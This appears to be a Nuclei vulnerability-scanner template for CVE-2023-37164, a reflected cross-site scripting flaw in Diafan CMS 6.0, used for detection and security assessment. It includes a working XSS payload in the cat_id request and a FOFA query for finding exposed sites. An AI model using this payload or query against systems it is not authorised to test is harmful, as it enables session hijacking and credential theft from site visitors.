id: CVE-2023-37164

info:
  name: Diafan CMS 6.0 - Cross-Site Scripting
  author: 0xr2r
  severity: medium
  description: |
    Diafan CMS v6.0 contains a reflected cross-site scripting vulnerability via the cat_id parameter at /shop/?module=shop&action=search. An attacker can inject malicious scripts into the search functionality, which are then reflected in the response without proper sanitization. This vulnerability allows attackers to execute arbitrary JavaScript in victims' browsers, potentially leading to session hijacking, credential theft, or other malicious activities.
  reference:
    - https://www.exploit-db.com/exploits/51529
    - https://github.com/advisories/GHSA-q7x6-ffhm-2jf6
    - https://nvd.nist.gov/vuln/detail/CVE-2023-37164
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-37164
    cwe-id: CWE-79
    epss-score: 0.00043
    epss-percentile: 0.09271
  metadata:
    verified: true
    max-request: 1
    vendor: diafan
    product: diafan_cms
    fofa-query: (icon_hash="-1091480403" || icon_hash="-1374284074") && body="/shop"
  tags: cve,cve2023,xss,reflected,diafan,cms,injection

http:
  - method: GET
    path:
      - '{{BaseURL}}/shop/?module=shop&action=search&cat_id=0&a="%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&pr1=0&pr2=0'

    host-redirects: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "><script>alert(document.domain)</script>")'
          - 'contains_any(tolower(body), "diafan.cms", "diafan_cookie")'
          - 'contains(content_type, "text/html")'
          - 'status_code == 200'
        condition: and
